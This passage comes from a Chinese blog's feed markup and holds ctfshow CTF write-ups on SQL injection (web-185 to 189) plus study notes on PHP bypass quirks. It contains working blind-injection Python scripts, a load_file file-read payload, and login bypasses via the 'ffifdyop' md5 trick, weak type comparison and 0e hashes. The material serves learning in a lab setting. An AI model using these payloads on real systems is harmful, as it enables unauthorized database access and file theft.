class="hljs-regexp">//</span>返回用户表的记录总数<br>      <span class="hljs-variable">$user_count</span> = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>过滤了数字，所以需要自己构造出数字</p><table><thead><tr><th>expression</th><th>number</th></tr></thead><tbody><tr><td>false</td><td>0</td></tr><tr><td>true</td><td>1</td></tr><tr><td>true+true</td><td>2</td></tr><tr><td>floor(pi())</td><td>3</td></tr><tr><td>ceil(pi())</td><td>4</td></tr><tr><td>floor(pi())+true</td><td>5</td></tr><tr><td>floor(pi())+floor(pi())</td><td>6</td></tr><tr><td>floor(pi())+ceil(pi())</td><td>7</td></tr><tr><td>ceil(pi())+ceil(pi())</td><td>8</td></tr><tr><td>floor(pi())*floor(pi())</td><td>9</td></tr><tr><td>floor(pi())*floor(pi())+true</td><td>10</td></tr></tbody></table><p><strong>我们这里使用”true+true”的形式即可构造出0-9的数字</strong></p><p><strong>然后使用concat进行连接，并且过滤了 <code>&quot;</code> <code>&#39;</code> 不能使用 concat(‘str’,‘str’) 进行拼接，字符与数字都需要自己构造 通过chr() 函数将数字转义为字符</strong></p><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://ec8ccd75-39a8-405b-a4b7-002d937996d0.challenge.ctf.show/select-waf.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renum</span>(<span class="hljs-params">n</span>):<br>    a = <span class="hljs-string">&#x27;true&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):<span class="hljs-comment">#因为我们已经把a赋值为true所以只需要循环n-1次即可</span><br>        a += <span class="hljs-string">&#x27;+true&#x27;</span><br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>:]<br>   <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renum_to_str</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n:<br>        <span class="hljs-built_in">str</span> += <span class="hljs-string">&quot;,chr(&quot;</span>+renum(<span class="hljs-built_in">ord</span>(i))+<span class="hljs-string">&quot;)&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>[<span class="hljs-number">1</span>:]<span class="hljs-comment">#需要去掉第0位的逗号,所以返回的是str[1:]</span><br>    <br><span class="hljs-comment">#ord先将字符转换为ascii码，然后再通过renum转换为true+true形式的ascii码，然后拼接成chr(&quot;true+true+...&quot;)的形式，就能绕过数字过滤了，在sql中会被组成chr(&quot;true+true+...&quot;),chr(&quot;true+true+...&quot;)形式，然后经过concat函数拼接即可成为字符串</span><br><br>flag = <span class="hljs-string">&quot;ctfshow&#123;&quot;</span><span class="hljs-comment">#初始化flag形式</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>        data = &#123;<span class="hljs-string">&quot;tableName&quot;</span>:<span class="hljs-string">&quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;</span>.<span class="hljs-built_in">format</span>(renum_to_str(flag+x))<span class="hljs-comment">#还是使用regexp正则匹配flag</span><br>                &#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&#x27;$user_count = 1;&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br>            flag += x<br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-186（同上）"><a href="#web-186（同上）" class="headerlink" title="web-186（同上）"></a>web-186（同上）</h2><hr><h2 id="web-187（mysql特性、md5）"><a href="#web-187（mysql特性、md5）" class="headerlink" title="web-187（mysql特性、md5）"></a>web-187（mysql特性、md5）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>  $sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>= <span class="hljs-string">&#x27;$password&#x27;</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">//只有admin可以获得flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>!=<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;用户名不存在&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>分析返回逻辑发现我们传入的$username必须为admin才会进行下一步sql查询，否则就会报错，所以只能在password上入手。</p><p><strong>MySQL的一个特性： 只要’or’后面的字符串为一个非零的数字开头都会返回True</strong></p><p><strong>关键代码：</strong></p><p><strong>$password &#x3D; md5($_POST[‘password’],true);</strong></p><p><strong>&#x2F;&#x2F; 如果可选的binary被设置为true 那么md5摘要将以16字符长度的原始二进制格式返回</strong></p><p><strong>&#x2F;&#x2F; 那么如果 md5($_POST[‘password’],true) 的返回值为 ‘or’1(除0外任意数字开头)xxx SQL语句将被拼接为</strong></p><p><strong>$sql&#x3D;”select count(*) from ctfshow_user where username&#x3D;’admin’ and password&#x3D;’’or’1xxx’”;</strong></p><p><strong>&#x2F;&#x2F; 密码输入 ffifdyop</strong></p><p><strong>md5(“ffifdyop”,true) &#x3D;&gt; ‘or’6É]é!r,ùíb</strong></p><p>payload：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">用户名：<span class="hljs-literal">admin</span><br>密码：ffifdyop<br></code></pre></td></tr></table></figure><p>点击登录并抓包放到重放器中然后发送，在响应包中就能看到flag</p><hr><h2 id="web-188（mysql弱类型比较）"><a href="#web-188（mysql弱类型比较）" class="headerlink" title="web-188（mysql弱类型比较）"></a>web-188（mysql弱类型比较）</h2><p>查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//拼接sql语句查找指定ID用户</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select pass from ctfshow_user where username = <span class="hljs-subst">&#123;$username&#125;</span>&quot;</span>;<br>    <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//用户名检测</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="hljs-variable">$username</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;用户名非法&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//密码检测</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;密码只能为数字&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//密码判断</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$password</span>))&#123;<span class="hljs-comment">//php中如果字符串中第一个字符不为其他数字，则与0若比较恒等</span><br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;登陆成功&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;data&#x27;</span>], <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;flag&#x27;</span>=&gt;<span class="hljs-variable">$flag</span>));<br>  &#125;<br>    <br></code></pre></td></tr></table></figure><p><strong>当一个字符串与数字比较时会把字符串转化为数字，如 <code>&#39;4ad&#39;=4</code></strong><br><strong>而当数字为0，且字符串开头不为其他数字时，弱类型恒成立</strong></p><p>payload：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">字符开头会被当作 <span class="hljs-number">0</span><br>所以当 username = <span class="hljs-number">0</span> 时 会返回列 pass 中所有以字符开头的值<br><br><br><span class="hljs-symbol">username:</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">password:</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-189（sql盲注、load-file函数读取文件、if）"><a href="#web-189（sql盲注、load-file函数读取文件、if）" class="headerlink" title="web-189（sql盲注、load_file函数读取文件、if）"></a>web-189（sql盲注、load_file函数读取文件、if）</h2><p>查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//拼接sql语句查找指定ID用户</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select pass from ctfshow_user where username = <span class="hljs-subst">&#123;$username&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//用户名检测</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="hljs-variable">$username</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;用户名非法&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//密码检测</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;密码只能为数字&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//密码判断</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;登陆成功&#x27;</span>;<br>  &#125;<br>    <br></code></pre></td></tr></table></figure><p><strong>此题提醒了flag在api&#x2F;index.php, 大概率就是让用load_file来读取函数</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pf">// username/<span class="hljs-built_in">pass</span> 输入 <span class="hljs-number">0</span>/<span class="hljs-number">0</span> 输出 密码错误<br>// username/<span class="hljs-built_in">pass</span> 输入 <span class="hljs-number">1</span>/<span class="hljs-number">0</span> 输出 查询失败<br>所以此题存在支持布尔盲注的条件<br><br><br>使用盲注, 利用上一题提到的特性,  当查询的username为字母开头时会自动转变成<span class="hljs-number">0</span>和数字对比,  那么可以传入<br><span class="hljs-keyword">user</span> = <span class="hljs-number">0</span> 或者 <span class="hljs-number">1</span>   (当<span class="hljs-keyword">user</span>为<span class="hljs-number">0</span>时,  会报错登录失败,  当<span class="hljs-keyword">user</span>为<span class="hljs-number">1</span>时,  会报错查询失败)<br><span class="hljs-built_in">pass</span> = 随意<br></code></pre></td></tr></table></figure><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://742e8e2f-6cee-40c4-a072-e021844a8844.challenge.ctf.show/api/index.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span><br><br><br>flag = <span class="hljs-string">&quot;ctfshow&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>        payload = <span class="hljs-string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="hljs-built_in">format</span>(flag+x)//如果成功匹配到就会为<span class="hljs-number">0</span>，然后用户名即为<span class="hljs-number">0</span>，就会返回密码错误，没匹配到就会返回<span class="hljs-number">1</span>，然后登录会返回查询失败<br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">r&#x27;\u5bc6\u7801\u9519\u8bef&#x27;</span>) &gt; <span class="hljs-number">0</span>://\u5bc6\u7801\u9519\u8bef为<span class="hljs-string">&#x27;密码错误&#x27;</span>的unicode编码，前面加r可以取消\的转义作用使其变成普通字符<br>            flag += x<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2025/03/02/php%E7%89%B9%E6%80%A7/"/>
      <url>/2025/03/02/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p><a href="https://www.runoob.com/php/php-preg_match.html">preg_match函数用法</a>，<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式语法</a>。</p><p><code>preg_match()</code>：执行正则表达式，进行字符串过滤。。<code>[0-9]</code>匹配0-9之间的所有字符。<code>/</code>相当于一个分隔符，<code>/../</code>之间的内容就是正则的语法。绕过方法：变量num为人工分配 ID 键的数值型数组，<code>preg_match()</code>就会失效。如<code>num[]=1,num[0]=1</code></p><hr><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数用法</a></p><p><strong><code>intval()</code>：将变量的值默认转化为十进制。绕过方法：可以使用&#x3D;&#x3D;的特性，如+16、16.0；或者进制转换后，左右变量也相等。</strong>   </p><p><strong>int intval ( mixed $var [, int $base &#x3D; 10 ] )</strong></p><p><strong>参数说明：</strong><br>    <strong>$var：要转换成 integer 的数量值。</strong><br>    <strong>$base：转化所使用的进制。</strong><br><strong>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</strong><br>    <strong>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</strong><br>    <strong>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</strong><br>    <strong>将使用 10 进制 (decimal)。</strong></p><ol><li><strong>使用array()类型的数组，<code>intval</code>遇到空数组为0，非空数组为1.</strong></li><li><strong>使用人工分配 ID 键的数值型数组，<code>intval</code>遇到空数组为0，非空数组为1。</strong></li></ol><hr><h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h3><p>在php中，三个等号“&#x3D;&#x3D;&#x3D;”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型</p><p>是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。可以使用<strong>进制转换</strong>进行绕过</p><hr><h3 id="正则匹配模式"><a href="#正则匹配模式" class="headerlink" title="正则匹配模式"></a>正则匹配模式</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">/i表示匹配大小写<br><br>字符 ^ 和 <span class="hljs-variable">$</span> 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br><br>m<br>多(more)行匹配<br>若存在换行\n并且有开始^或结束<span class="hljs-variable">$</span>符的情况下，<br>将以换行为分隔符，逐行进行匹配<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;abc\nabc&quot;</span>;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&quot;/^abc<span class="hljs-variable">$</span>/m&quot;</span>;<br>preg_match(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。<br><br>s<br>特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;abggab\nacbs&quot;</span>;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&quot;/b./s&quot;</span>;<br>preg_match_all(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样匹配到的有三个 bg b\n bs<br><br>g<br>全局匹配，查找所有匹配项<br><br>A<br>强制从目标字符串开头匹配;<br><br>D<br>如果使用<span class="hljs-variable">$</span>限制结尾字符,则不允许结尾有换行; <br><br>e<br>配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; <br></code></pre></td></tr></table></figure><hr><h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>在php中两个等号&#x3D;&#x3D;是弱类型比较，只需要值相等，不会检测类型是否相同，类型不同时会自动转换</p><p>特殊情况：</p><p>0exxx类型字符串不管0e后的数字如何，都为0所以可以绕过弱类型比较</p><p>如果一个0与一个字符串进行弱类型比较，字符串会被转化为0，最后比较结果为true</p><hr><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><p><strong>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</strong><br><strong>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</strong><br><strong>strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</strong><br><strong>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</strong></p><hr><h3 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h3><p><code>highlight_file()</code> 函数用于将指定文件的内容以 HTML 格式进行高亮显示，并输出到浏览器。</p><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$return</span> = <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><code>$filename</code>：必需，要高亮显示的文件路径。</li><li><code>$return</code>：可选，如果设置为 <code>true</code>，则返回高亮显示的文件内容，否则将内容直接输出到浏览器。</li></ul><p>返回值： 如果 <code>$return</code> 参数设置为 <code>true</code>，则返回高亮显示的文件内容；否则没有返回值。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&quot;example.php&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上述示例将会将名为 <code>example.php</code> 的文件内容以 HTML 格式进行高亮显示，并输出到浏览器。</p><hr><h3 id="md5-加密函数"><a href="#md5-加密函数" class="headerlink" title="md5()加密函数"></a>md5()加密函数</h3><p><a href="https://www.runoob.com/php/func-string-md5.html">md5函数用法</a></p><p>md5() 函数计算字符串的 MD5 散列。</p><p>md5() 函数使用 RSA 数据安全，包括 MD5 报文摘要算法。</p><p>来自 RFC 1321 的解释 -  MD5 报文摘要算法：<em>MD5 报文摘要算法将任意长度的信息作为输入值，并将其换算成一个 128  位长度的”指纹信息”或”报文摘要”值来代表这个输入值，并以换算后的值作为结果。MD5  算法主要是为数字签名应用程序而设计的；在这个数字签名应用程序中，较大的文件将在加密（这里的加密过程是通过在一个密码系统下[如：RSA]的公开密钥下设置私有密钥而完成的）之前以一种安全的方式进行压缩。</em></p><p>如需计算文件的 MD5 散列，请使用 <a href="https://www.runoob.com/php/func-string-md5-file.html">md5_file()</a> 函数。</p><p><strong>md5() 函数不能处理数组，数组都返回 null，md5(a[])  结果为 null。</strong></p><h4 id="md5弱类型比较"><a href="#md5弱类型比较" class="headerlink" title="md5弱类型比较"></a>md5弱类型比较</h4><p><strong>题目一：</strong></p><p><strong>一个字符串与<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后的值相等</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-variable">$md5</span> == md5(<span class="hljs-variable">$md5</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>特性：0exxx类型字符串在php弱类型比较中的值都为0</p><p>题目要求一个字符串与<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后的值相等，通过上面PHP 0e漏洞的原理，也就将此题转化成 &#x3D;&#x3D;&gt;寻找一个字符串（0e开头）加密后（还是0e开头），弱比较相等。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">特殊值<br><span class="hljs-number">0</span>e215962017<br><br>echo md5<span class="hljs-punctuation">(</span>&#x27;0e<span class="hljs-number">21596201</span>7&#x27;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><br><br><span class="hljs-meta">#0e291242476940776845150308577824</span><br></code></pre></td></tr></table></figure><hr><p>题目二：</p><p><strong>两个字符串md5后进行弱类型比较相等</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> != <span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GET_FLAG：&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;md5校验出错...&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名密码不能相等！&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 用户名密码不能相等<br></code></pre></td></tr></table></figure><p>题目中，要求两个字符串值不能相等，但是两个字符串经过md5加密后的值需要相等，通过上面PHP 0e漏洞的原理，也就将此题转化成 &#x3D;&#x3D;&gt; 寻找两个值加密后以0e开头，且0e后面是纯数字的字符串即可，</p><figure class="highlight dns"><table><tr><td 